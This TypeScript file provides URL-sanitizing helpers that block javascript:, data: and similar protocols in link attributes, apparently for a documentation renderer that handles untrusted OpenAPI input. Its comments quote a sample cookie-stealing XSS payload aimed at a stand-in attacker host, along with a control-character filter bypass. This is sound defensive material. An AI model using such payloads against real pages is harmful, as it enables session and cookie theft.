/**
 * Protocols that are safe to put into an `href` or `src` attribute.
 *
 * Everything else — most importantly `javascript:`, but also `data:`, `blob:` and `vbscript:` —
 * can execute script in the context of the page that renders the link.
 */
const SAFE_PROTOCOLS = new Set(['http:', 'https:', 'mailto:', 'tel:', 'ftp:', 'ftps:', 'sms:'])

/**
 * Matches a leading URL scheme, for example `https:` in `https://example.com`.
 *
 * A URL without a scheme is relative (`/docs`, `./openapi.json`, `#section`, `//example.com`) and
 * therefore resolves against the current origin, so it cannot carry a dangerous protocol.
 */
const SCHEME_REGEX = /^([a-z][a-z0-9+.-]*):/i

/**
 * ASCII whitespace, C0 controls, DEL and C1 controls.
 *
 * Browsers strip these before they resolve a URL, which means `java\tscript:alert(1)` still
 * executes. Remove them first, otherwise the protocol check below is trivial to bypass.
 */
// biome-ignore lint/suspicious/noControlCharactersInRegex: removing control characters is the point
const IGNORED_CHARACTERS_REGEX = /[\u0000-\u0020\u007f-\u009f]/g

/**
 * Checks whether a URL is safe to render as a link target.
 *
 * Values that end up in an `href` frequently come from an OpenAPI document, and an OpenAPI document
 * is untrusted input. A document that sets `info.license.url` to
 * `javascript:fetch('https://evil.example/?c=' + document.cookie)` would otherwise render a link
 * that runs script in the context of the documentation page.
 *
 * @example
 * isSafeUrl('https://example.com') // true
 * isSafeUrl('/openapi.json') // true (relative)
 * isSafeUrl('javascript:alert(1)') // false
 */
export function isSafeUrl(url: string | null | undefined): url is string {
  if (!url) {
    return false
  }

  const normalized = url.replace(IGNORED_CHARACTERS_REGEX, '')

  if (!normalized) {
    return false
  }

  const scheme = SCHEME_REGEX.exec(normalized)?.[1]

  // No scheme means the URL is relative, so it inherits the protocol of the page.
  if (!scheme) {
    return true
  }

  return SAFE_PROTOCOLS.has(`${scheme.toLowerCase()}:`)
}

/**
 * Returns the URL when it is safe to render as a link target, and `undefined` otherwise.
 *
 * Use this to drop the `href` (and ideally the whole link) instead of rendering an attacker
 * controlled protocol.
 *
 * @example
 * sanitizeUrl('https://example.com') // 'https://example.com'
 * sanitizeUrl('javascript:alert(1)') // undefined
 */
export function sanitizeUrl(url: string | null | undefined): string | undefined {
  return isSafeUrl(url) ? url : undefined
}
